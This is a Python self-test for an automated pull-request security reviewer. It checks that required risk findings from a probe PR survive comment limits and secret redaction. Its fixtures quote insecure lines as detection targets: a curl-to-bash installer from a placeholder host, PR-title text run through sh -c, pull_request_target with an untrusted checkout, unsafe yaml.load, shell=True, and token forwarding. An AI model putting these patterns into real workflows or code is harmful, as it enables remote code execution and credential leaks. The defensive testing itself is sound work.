#!/usr/bin/env python3
"""Regression self-test for the DCOIR Review v7 runtime patch layer."""

from __future__ import annotations

from types import SimpleNamespace

import dcoir_review_required_runtime_patch_v7 as v7
import openrouter_pr_review as base
from dcoir_review.entrypoint import DcoirReviewEntrypoint


class Config(SimpleNamespace):
    max_inline_comments: int = 12
    redact_secret_literals: bool = True


class FakeHardened:
    ReviewQualityError = RuntimeError

    def __init__(self) -> None:
        self.debug: dict[str, object] = {}

    def required_risk_sentinels(self, sentinels):
        return list(sentinels)

    def write_debug_json_artifact_safely(self, _config, path, data):
        self.debug[path] = data


def sentinel(path: str, line: int, text: str, label: str = "") -> SimpleNamespace:
    return SimpleNamespace(path=path, line=line, text=text, label=label, detail=label)


def pr330_sentinels() -> list[SimpleNamespace]:
    return [
        sentinel(".github/workflows/probe.yml", 3, "  pull_request_target:"),
        sentinel(".github/workflows/probe.yml", 5, "  pull-requests: write"),
        sentinel(".github/workflows/probe.yml", 13, "          ref: ${{ github.event.pull_request.head.ref }}"),
        sentinel(".github/workflows/probe.yml", 15, "        run: curl -fsSL https://downloads.example.invalid/install.sh | bash"),
        sentinel(".github/workflows/probe.yml", 17, "        run: sh -c \"${{ github.event.pull_request.title }}\""),
        sentinel("probe.ps1", 7, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Users", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")'),
        sentinel("probe.ps1", 12, 'Start-Process -FilePath $CollectorExe -ArgumentList "/out", $WorkingRoot -Wait'),
        sentinel("probe.ps1", 15, '$token = $env:DCOIR_TOKEN Invoke-RestMethod -Uri $WebhookUri -Headers @{ Authorization = "Bearer $token" } -Method Post'),
        sentinel("probe.py", 9, "    return yaml.load(raw_text, Loader=yaml.Loader)"),
        sentinel("probe.py", 13, "    return subprocess.Popen(command_text, shell=True)"),
        sentinel("probe.py", 18, 'api_token = os.getenv("DCOIR_TOKEN") headers = {"Authorization": f"Bearer {api_token}"}'),
    ]


def pr330_findings(include_broad_write: bool = True) -> list[dict[str, object]]:
    findings: list[dict[str, object]] = [
        {"path": "probe.py", "line": 9, "title": "Unsafe YAML deserialization", "body": "yaml.load with yaml.Loader allows unsafe deserialization", "confidence": 1.0},
        {"path": "probe.py", "line": 13, "title": "subprocess shell=True", "body": "subprocess.Popen uses shell=True", "confidence": 1.0},
        {"path": "probe.py", "line": 18, "title": "Environment token forwarded", "body": "DCOIR_TOKEN is sent in Authorization header to callback_url", "confidence": 0.98},
        {"path": ".github/workflows/probe.yml", "line": 3, "title": "pull_request_target with write permissions", "body": "pull_request_target privileged context", "confidence": 1.0},
        {"path": ".github/workflows/probe.yml", "line": 13, "title": "Untrusted checkout", "body": "checkout of untrusted PR head ref", "confidence": 1.0},
        {"path": ".github/workflows/probe.yml", "line": 15, "title": "curl piped to bash", "body": "network installer piped into shell", "confidence": 0.98},
        {"path": ".github/workflows/probe.yml", "line": 17, "title": "PR title shell execution", "body": "pull request title metadata executed by shell command", "confidence": 1.0},
        {"path": "probe.ps1", "line": 10, "title": "Broad ACL grant", "body": "Set-Acl applies FileSystemAccessRule with FullControl", "confidence": 0.95},
        {"path": "probe.ps1", "line": 12, "title": "Start-Process caller controlled", "body": "Start-Process launches caller supplied CollectorExe", "confidence": 0.97},
        {"path": "probe.ps1", "line": 15, "title": "Environment token forwarded", "body": "$env:DCOIR_TOKEN sent in Authorization header to callback URI", "confidence": 0.98},
        {"path": "optional.ts", "line": 2, "title": "new Function", "body": "new Function executes source", "confidence": 0.97},
    ]
    if include_broad_write:
        findings.insert(4, {"path": ".github/workflows/probe.yml", "line": 5, "title": "Broad workflow permissions grant repository write access", "body": "pull-requests: write grants write permission token access", "confidence": 0.98})
        findings.append({"path": ".github/workflows/probe.yml", "line": 5, "title": "Duplicate write permission", "body": "workflow grants pull-requests: write permission", "confidence": 1.0})
    return findings


def test_pr330_required_ledger_survives_optional_pressure() -> None:
    hardened = FakeHardened()
    result = v7._select_required_postable(hardened, None, None, None, pr330_findings(True), pr330_sentinels(), Config())
    keys = {v7._postable_key(finding) for finding in result}
    required = {v7._sentinel_key(item) for item in pr330_sentinels()}
    assert required <= keys, sorted(required - keys)
    assert len(result) <= 12
    assert (".github/workflows/probe.yml", 5, "yaml_broad_write") in keys


def test_pr330_missing_broad_write_gets_forced_fallback() -> None:
    hardened = FakeHardened()
    result = v7._select_required_postable(hardened, None, None, None, pr330_findings(False), pr330_sentinels(), Config())
    keys = {v7._postable_key(finding) for finding in result}
    assert (".github/workflows/probe.yml", 5, "yaml_broad_write") in keys
    metadata = hardened.debug["metadata/required-v7-coverage.json"]
    assert ".github/workflows/probe.yml:5 yaml_broad_write" in metadata["fallback_keys_added"]


def test_capacity_failure_is_explicit() -> None:
    hardened = FakeHardened()
    try:
        v7._select_required_postable(hardened, None, None, None, pr330_findings(True), pr330_sentinels(), Config(max_inline_comments=3, redact_secret_literals=True))
    except RuntimeError as exc:
        assert "exceed inline budget" in str(exc)
    else:
        raise AssertionError("expected capacity failure")


def test_safe_auth_line_classification() -> None:
    assert v7._safe_auth_line('headers = {"Authorization": f"Bearer {api_token}"}')
    assert v7._safe_auth_line('$headers = @{ Authorization = "Bearer $token" }')
    assert v7._safe_auth_line('headers.Authorization = `Bearer ${process.env.DCOIR_TOKEN}`')
    assert not v7._safe_auth_line('headers = {"Authorization": "Bearer abcdefghijklmnopqrstuvwxyz"}')


def test_sanitize_preserves_interpolated_bearer_lines() -> None:
    v7._patch_sanitize_text(base)
    text = '\n'.join([
        'api_token = os.getenv("DCOIR_TOKEN")',
        'headers = {"Authorization": f"Bearer {api_token}"}',
        '$headers = @{ Authorization = "Bearer $token" }',
    ])
    cleaned = base.sanitize_text(text, Config())
    assert 'f"Bearer {api_token}"' in cleaned
    assert '"Bearer $token"' in cleaned


def test_entrypoint_loads_v7_after_v6() -> None:
    patch_modules = DcoirReviewEntrypoint().patch_module_names
    assert "dcoir_review_required_runtime_patch_v6" in patch_modules
    assert "dcoir_review_required_runtime_patch_v7" in patch_modules
    assert patch_modules.index("dcoir_review_required_runtime_patch_v6") < patch_modules.index("dcoir_review_required_runtime_patch_v7")


def main() -> None:
    test_pr330_required_ledger_survives_optional_pressure()
    test_pr330_missing_broad_write_gets_forced_fallback()
    test_capacity_failure_is_explicit()
    test_safe_auth_line_classification()
    test_sanitize_preserves_interpolated_bearer_lines()
    test_entrypoint_loads_v7_after_v6()
    print("dcoir_review_required_runtime_patch_v7_selftest passed")


if __name__ == "__main__":
    main()
